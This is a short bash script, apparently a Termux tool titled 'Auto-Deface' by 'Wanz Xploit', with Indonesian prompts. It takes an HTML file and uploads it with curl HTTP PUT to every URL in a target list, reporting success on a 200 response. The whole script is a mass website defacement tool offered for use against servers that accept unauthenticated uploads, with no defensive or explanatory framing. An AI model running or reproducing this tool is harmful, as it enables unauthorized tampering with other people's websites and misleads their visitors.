#!/bin/bash

echo -e "\033[1;34m
   ___       __           ___      ___            
  / _ |__ __/ /____  ____/ _ \\___ / _/__ ________ 
 / __ / // / __/ _ \\/___/ // / -_) _/ _ \`/ __/ -_)
/_/ |_\_,_/\__/\\___/   /____/\\__/_/ \\_,_/\\__/\__/ 
\033[0m
"

function print_separator {
  echo "================================================="
}

print_separator
echo -e "\033[1;33mAuthor: Wanz Xploit\033[0m"
print_separator
echo -e "\033[1;33mInstagram: \033[4mhttps://www.instagram.com/wanz_xploit/\033[0m"
print_separator
echo -e "\033[1;33mFacebook: \033[4mhttps://www.facebook.com/wanzxploit/\033[0m"
print_separator
echo -e "\033[1;33mYouTube: \033[4mhttps://www.youtube.com/c/WanzXploit\033[0m"
print_separator
echo -e "\033[1;33mGitHub: \033[4mhttps://github.com/wanzxploit\033[0m"
print_separator
echo

read -p "Masukkan nama file script HTML: " filename

filepath="/storage/emulated/0/$filename"

while IFS= read -r target; do
  response=$(curl -s -o /dev/null -w "%{http_code}" -T "$filepath" "$target")
  
  if [ "$response" = "200" ]; then
    echo -e "\033[0;32mSukses\033[0m: $target"
  else
    echo -e "\033[0;31mGagal\033[0m: $target"
  fi
done < target.txt
